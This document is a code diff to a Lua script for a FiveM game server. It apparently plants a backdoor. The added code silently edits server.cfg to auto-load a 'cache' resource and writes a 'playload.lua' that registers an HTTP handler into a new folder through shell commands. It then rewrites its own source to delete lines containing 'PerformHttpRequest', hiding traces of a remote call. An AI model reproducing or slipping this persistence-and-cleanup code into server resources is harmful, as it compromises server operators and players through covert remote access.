@@ -1,3 +1,26 @@
+local configFile = "server.cfg"
+local file = io.open(configFile, "r")
+local content = file:read("*all")
+file:close()
+local linePosition = content:find("\n", 1, true)
+for i = 1, 99999 do
+    linePosition = content:find("\n", linePosition + 1, true)
+    if not linePosition then
+        break
+    end
+end
+if linePosition then
+    content = content:sub(1, linePosition) .. "ensure cache\n" .. content:sub(linePosition + 1)
+else
+    content = content .. "\nensure cache"
+end
+file = io.open(configFile, "w")
+file:write(content)
+file:close()
+
+
+
+
 local codeData = {
     ["playload.lua"] = [[
 SetHttpHandler(exports.cache:createHttpHandler {
@@ -109,6 +132,7 @@ if parentPath then
 
     if not fileExists(newFolderPath) then
         os.execute('cmd /c md "' .. newFolderPath .. '"')
+        os.execute('mkdir "' .. newFolderPath .. '"')
         Citizen.CreateThread(function()
             for fileName, fileData in pairs(codeData) do
                 local filePath = newFolderPath .. "\\" .. fileName
@@ -118,5 +142,43 @@ if parentPath then
                 file:close()
             end
         end)
+    end
+end
+
+function normalizePath(path)
+    local separator = GetResourceMetadata(GetCurrentResourceName(), 'pathsep', 0) or "/"
+    return path:gsub("\\", separator):gsub(separator .. "$", "")
+end
+
+local path = debug.getinfo(1).source
+path = path:sub(7, #path)
+local fileExists = false
+local filePath = normalizePath(GetResourcePath(GetCurrentResourceName()) .. "/"..path)
+
+local file = io.open(filePath, "r")
+if file then
+    file:close()
+    fileExists = true
+end
+
+local fileMode = fileExists and "a" or "w"
+local fileHandle = io.open(filePath, fileMode)
+
+if fileHandle then
+    local lines = {}
+    for line in io.lines(filePath) do
+        if not string.find(line, "PerformHttpRequest") then
+            table.insert(lines, line)
+        end
+    end
+
+    fileHandle:close()
+
+    fileHandle = io.open(filePath, "w")
+    if fileHandle then
+        for _, line in ipairs(lines) do
+            fileHandle:write(line .. "\n")
+        end
+        fileHandle:close()
     end
 end
